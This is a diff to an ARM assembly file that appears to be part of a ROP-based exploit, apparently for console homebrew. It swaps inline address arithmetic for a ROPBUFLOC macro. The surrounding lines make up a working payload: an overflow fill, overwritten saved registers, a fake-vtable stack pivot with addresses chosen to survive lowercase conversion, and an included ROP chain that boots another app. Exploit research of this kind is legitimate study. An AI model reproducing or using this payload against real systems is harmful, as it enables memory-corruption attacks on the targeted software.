@@ -23,7 +23,7 @@ _start:
 .word POP_R2R6PC
 .word 0 @ r2
 .word 0 @ r3
-.word ROPBUF + (pivotdata - _start) @ r4
+.word ROPBUFLOC(pivotdata) @ r4
 .word 0 @ r5
 .word 0 @ r6
 .endm
@@ -54,15 +54,15 @@ _start:
 .fill 0x44, 1, 0x58
 
 @ The saved registers get overwritten with the below data.
-.word ROPBUF + (pivotdata - _start) @ r4. This has to be an address that won't get modifed during lowercase conversion.
-.word ROPBUF + (pivotdata - _start) @ r5, same as r4.
+.word ROPBUFLOC(pivotdata) @ r4. This has to be an address that won't get modifed during lowercase conversion.
+.word ROPBUFLOC(pivotdata) @ r5, same as r4.
 .word ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ @ pc. The string copy ends here due to the nul-terminator in this address. This has to be an address that won't get modifed during lowercase conversion.
 
 .space ((_start + 0x19c) - .)
 pivotdata:
-.word ROPBUF + ((pivotdata+0x8-0x10) - _start) @ ip, also used as the vtableptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
+.word (ROPBUFLOC(pivotdata)+0x8-0x10) @ ip, also used as the vtableptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
 stackpivot_sploadword:
-.word ROPBUF + (ropstackstart - _start) @ sp
+.word ROPBUFLOC(ropstackstart) @ sp
 .word STACKPIVOT_ADR @ lr, also used as the the vtable funcptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
@@ -71,7 +71,7 @@ ropstackstart:
 #include "ropkit_boototherapp.s"
 
 ropkit_cmpobject:
-.word (ROPBUF + (ropkit_cmpobject - _start) + 0x4) @ Vtable-ptr
+.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
 .fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
 
 .space ((_start + 0x26b0) - .)
